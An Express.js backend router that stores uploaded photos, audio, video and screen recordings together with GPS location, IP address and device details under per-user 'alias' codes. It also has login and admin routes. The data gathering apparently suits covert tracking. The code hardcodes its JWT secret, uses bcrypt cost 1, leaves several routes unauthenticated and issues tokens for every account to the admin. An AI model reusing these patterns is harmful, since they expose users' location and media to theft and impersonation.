const router = require('express').Router();
const multer = require('multer');
const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const accessTokenSecret = "18a6bfebf8ce3e8e867d8c919d09797407305455e8e8deafe987";
const salt = 1;
const fs = require('fs');
const { client, insertFileData, insertUserData } = require('./db');

const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/');
    },
    filename: function (req, file, cb) {
        cb(null, file.fieldname + '-' + Date.now() + '.webm');
    }
});
const upload = multer({ storage: storage });



router.post('/take-photo', async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, timestamp, altitude, img, alias, ip, iptype, devicebrand, devicename, devicetype, osname } = req.body;
        const imagePath = `${Date.now()}.${Math.round(
            Math.random() * 1e9
        )}.png`;
        const buffer = Buffer.from(img.replace(/^data:image\/(png|jpg|jpeg);base64,/, ''), 'base64');
        fs.writeFile(`uploads/${imagePath}`, buffer, function (err) {
            if (!err) {
                console.log("file is created")
            }
        });
        const filepath = `uploads/${imagePath}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'take photo',
            duration: 0,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }
        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
})


router.post('/take-snap', async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, timestamp, altitude, img, alias, ip, iptype, devicebrand, devicename, devicetype, osname } = req.body;
        const imagePath = `${Date.now()}.${Math.round(
            Math.random() * 1e9
        )}.png`;
        const buffer = Buffer.from(img.replace(/^data:image\/(png|jpg|jpeg);base64,/, ''), 'base64');
        fs.writeFile(`uploads/${imagePath}`, buffer, function (err) {
            if (!err) {
                console.log("file is created")
            }
        });
        const filepath = `uploads/${imagePath}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'take snap',
            duration: 0,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }
        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
})


router.post('/audio', upload.single('audio'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, timestamp, altitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }
        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/videowith', upload.single('videowith'), async (req, res) => {
    try {
        const { filename, date, time, duration, alias, ip, latitude, longitude, timestamp, altitude, iptype, devicebrand, devicename, devicetype, osname } = req.body;
        const filepath = `${req.file.path}`;

        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'video with audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }

        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/videowithout', upload.single('videowithout'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, timestamp, altitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, osname } = req.body;
        const filepath = `${req.file.path}`;

        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'video without audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }
        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/screenwithout', upload.single('screenwithout'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, timestamp, altitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'screen without audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }
        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/screenwith', upload.single('screenwith'), async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, timestamp, altitude, duration, alias, ip, iptype, devicebrand, devicename, devicetype, osname } = req.body;
        const filepath = `${req.file.path}`;
        const data = {
            alias: alias,
            filename: filename,
            filepath: filepath,
            filetype: 'screen with audio recording',
            duration: duration,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }
        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/geo-snap', async (req, res) => {
    try {
        const { filename, date, time, latitude, longitude, timestamp, altitude, alias, ip, iptype, devicebrand, devicename, devicetype, osname, filetype } = req.body;
        const data = {
            alias: alias,
            filename: filename,
            filetype: filetype,
            filepath: null,
            duration: 0,
            date: date,
            time: time,
            latitude: latitude,
            longitude: longitude,
            timestamp: timestamp,
            altitude: altitude,
            ip: ip,
            iptype: iptype,
            devicename: devicename,
            devicebrand: devicebrand,
            devicetype: devicetype,
            osname: osname,
            event_time: new Date().toISOString()
        }
        console.log(data);
        insertFileData(data);
        res.send({ message: "File Saved", data });
    } catch (err) {
        res.send({ message: "Internal Server Error" });
    }
});


router.post('/aliasdata', async (req, res) => {
    try {
        const { alias } = req.body;
        if (alias === '') {
            return res.send({ message: "alias mdata may not be empty" });
        }

        const selectQuery = 'SELECT * FROM files WHERE alias = ? ORDER BY event_time DESC';
        client.execute(selectQuery, [alias])
            .then(result => {
                const rows = result.rows;
                return res.send({ message: `your aliascode ${alias} files`, rows });
            });
    } catch (err) {
        return res.send({ message: "Internal Server Error" });
    }
});

router.post('/aliasdata2', async (req, res) => {
    try {
        const { alias, filetype } = req.body;

        if (alias === '' || filetype === '') {
            return res.send({ message: "data may not be empty" });
        }

        console.log(alias, filetype);
        const rows = [];

        if (filetype === "video") {
            // video with audio recording
            // video without audio recording
            const fileTypesToQuery = ['video with audio recording', 'video without audio recording'];
            const selectQuery = 'SELECT * FROM files WHERE alias = ? AND filetype IN ? ORDER BY event_time DESC ALLOW FILTERING';
            const result = await client.execute(selectQuery, [alias, fileTypesToQuery]);
            rows.push(...result.rows);
        } else if (filetype === "screen") {
            // screen without audio recording
            // screen with audio recording
            const fileTypesToQuery = ['screen with audio recording', 'screen without audio recording'];
            const selectQuery = 'SELECT * FROM files WHERE alias = ? AND filetype IN ? ORDER BY event_time DESC ALLOW FILTERING';
            const result = await client.execute(selectQuery, [alias, fileTypesToQuery]);
            rows.push(...result.rows);
            
        } else {
            const selectQuery = 'SELECT * FROM files WHERE alias = ? AND filetype = ? ORDER BY event_time DESC ALLOW FILTERING';
            const result = await client.execute(selectQuery, [alias, filetype]);
            rows.push(...result.rows);
        }

        return res.send({ rows });
    } catch (err) {
        console.error(err);
        return res.status(500).send({ message: "Internal Server Error" });
    }
});



// user authetication routes
// signup
router.post("/signup", async (req, res) => {
    try {
        const { alias, companyname, name, avatar, email, password } = req.body;
        let user;
        let isAdmin = false;
        const searchQuery = `SELECT * FROM users WHERE alias = ?`;

        await client.execute(searchQuery, [alias])
            .then(result => {
                user = result.rows[0];
                // console.log(user);
            })
            .catch(error => {
                console.error('Error searching user', error);
            });


        if (user) {
            return res.status(409).send({ message: "User given email already exist" });
        }
        const hashPassword = await bcrypt.hash(password, salt);


        const data = {
            alias: alias,
            companyname: companyname,
            name: name,
            avatar: avatar,
            email: email,
            password: hashPassword,
        };

        insertUserData(data);
        const token = jwt.sign({ alias }, accessTokenSecret, { expiresIn: '7d' });
        return res.status(201).send({ user: data, token: token, message: "User created successfully", isAdmin });

    } catch (error) {
        console.log(error);
        res.status(500).send({ message: "Internal Server Error" });
    }
})


// login
router.post("/login", async (req, res) => {
    try {
        const { alias, password } = req.body;
        let user;
        let isAdmin = false;

        const searchQuery = `SELECT * FROM users WHERE alias = ?`;

        await client.execute(searchQuery, [alias])
            .then(result => {
                user = result.rows[0];
                // console.log(user);
            })
            .catch(error => {
                console.error('Error searching user', error);
            });

        if (!user) {
            return res.status(401).send({ message: "Invalid Email or Password" });
        }

        const validPassword = await bcrypt.compare(password, user.password);

        if (!validPassword)
            return res.status(401).send({ message: "Invalid Email or Password" });

        if (user.email === "smartsnapper@gmail.com" && user.alias === "adminalias") {
            isAdmin = true;
        }

        const token = jwt.sign({ alias }, accessTokenSecret, { expiresIn: '7d' });
        return res.status(200).send({ user: user, token: token, message: "Logged Successfully", isAdmin });

    } catch (error) {
        res.status(500).send({ message: "Internal Server Error" });
    }
})


// get profile
router.post("/profile", async (req, res) => {
    const { token } = req.body;
    let userData = jwt.verify(token, accessTokenSecret);
    let alias = userData.alias;

    const searchQuery = `SELECT *FROM users where alias = ?`;

    await client.execute(searchQuery, [alias])
        .then(result => {
            allAlias = result.rows;
        })
        .catch(error => {
            console.error('Error searching user', error);
        });

    for (let i = 0; i < allAlias.length; i++) {
        let temp = allAlias[i].alias;
        const token = jwt.sign({ alias: temp }, accessTokenSecret, { expiresIn: '7d' });
        allAlias[i].token = token;
    }

    res.status(201).send({ allAlias });
})

// get refresh
router.post("/refresh", async (req, res) => {
    const { token } = req.body;
    let userData = jwt.verify(token, accessTokenSecret);
    let alias = userData.alias;
    let isAdmin = false;
    let user;

    const searchQuery = `SELECT *FROM users where alias = ?`;

    await client.execute(searchQuery, [alias])
        .then(result => {
            user = result.rows[0];
        })
        .catch(error => {
            console.error('Error searching user', error);
        });

    if (user.email === "smartsnapper@gmail.com" && user.alias === "adminalias") {
        isAdmin = true;
    }

    const newToken = jwt.sign({ alias }, accessTokenSecret, { expiresIn: '7d' });
    return res.status(200).send({ user: user, token: newToken, message: "Logged Successfully", isAdmin });

})



// admin
// get all alias
router.post("/getalias", async (req, res) => {
    const { token } = req.body;
    let userData = jwt.verify(token, accessTokenSecret);

    let allAlias;

    if (userData.alias !== "adminalias") {
        return res.status(401).send({ message: "Invalid token" });
    }

    const searchQuery = `SELECT *FROM users`;

    await client.execute(searchQuery)
        .then(result => {
            allAlias = result.rows;
        })
        .catch(error => {
            console.error('Error searching user', error);
        });

    for (let i = 0; i < allAlias.length; i++) {
        let temp = allAlias[i].alias;
        const token = jwt.sign({ alias: temp }, accessTokenSecret, { expiresIn: '7d' });
        allAlias[i].token = token;
    }

    res.status(201).send({ allAlias });

})


// update
router.post("/update", async (req, res) => {
    try {
        const { token, email, name } = req.body;
        let userData = jwt.verify(token, accessTokenSecret);
        let alias = userData.alias;

        console.log(alias)

        const updateQuery = `UPDATE users SET email = ?, name = ? WHERE alias = ?`;

        client.execute(updateQuery, [email, name, alias])
            .then(() => {
                console.log('User updated successfully');
            })
            .catch(error => {
                console.error('Error updating user', error);
            });

        let user;

        const searchQuery = `SELECT * FROM users WHERE alias = ?`;

        await client.execute(searchQuery, [alias])
            .then(result => {
                user = result.rows[0];
            })
            .catch(error => {
                console.error('Error searching user', error);
            });

        return res.status(201).send({ message: "Updated successfully" });

    } catch (error) {
        console.log(error);
        return res.status(500).send({ message: "Internal Server Error" });
    }
})


// update avatar
router.post("/updateavatar", async (req, res) => {
    try {
        const { alias, avatar } = req.body;

        const imagePath = `${Date.now()}.${Math.round(
            Math.random() * 1e9
        )}.png`;
        const buffer = Buffer.from(avatar.replace(/^data:image\/(png|jpg|jpeg);base64,/, ''), 'base64');
        fs.writeFile(`uploads/${imagePath}`, buffer, function (err) {
            if (!err) {
                console.log("file is created")
            }
        });
        const filepath = `uploads/${imagePath}`;

        const updateQuery = `UPDATE users SET avatar = ? WHERE alias = ?`;

        client.execute(updateQuery, [filepath, alias])
            .then(() => {
                console.log('Avatar updated successfully');
            })
            .catch(error => {
                console.error('Error updating user', error);
            });

        let user;

        const searchQuery = `SELECT * FROM users WHERE alias = ?`;

        await client.execute(searchQuery, [alias])
            .then(result => {
                user = result.rows[0];
                // console.log(user);
            })
            .catch(error => {
                console.error('Error searching user', error);
            });

        return res.status(201).send({ message: "Avatar Updated successfully", user: user });

    } catch (error) {
        console.log(error);
        res.status(500).send({ message: "Internal Server Error" });
    }
})


module.exports = router